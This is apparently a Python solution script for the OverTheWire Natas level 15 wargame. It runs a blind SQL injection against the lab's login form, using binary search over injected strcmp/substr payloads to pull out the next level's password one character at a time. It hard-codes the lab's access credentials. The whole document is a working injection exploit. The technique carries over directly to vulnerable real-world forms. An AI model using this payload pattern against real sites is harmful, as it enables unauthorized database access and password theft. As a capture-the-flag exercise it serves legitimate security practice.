#!/usr/bin/python3

# coding : utf-8


import requests
import string

password = ""
charset = "".join(sorted(string.ascii_letters + string.digits))

pass_len = 32 # you can check it using this payload natas16" and length(password) = 32#

charset_len = len(charset)

URL = "http://natas15.natas.labs.overthewire.org/index.php"
s = requests.Session()
s.auth = ("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")
payload = {"username": ""}
# let's use binary search to speed things up

for i in range(1, 32+1):
    lo = 0
    hi = charset_len - 1
    while True:
        if (hi < lo):
            password += charset[lo]
            print("current password: {}".format(password))
            break
        index = (lo + hi) // 2
        possible_char = charset[index]
        payload["username"] = 'natas16" and strcmp(BINARY substr(password, {}, 1), "{}") > 0#'.format(i, possible_char)
        res = s.post(URL, data=payload)
        if res.status_code == 200:
            if "user exists" in res.text:
                lo = index + 1
            else:
                hi = index - 1













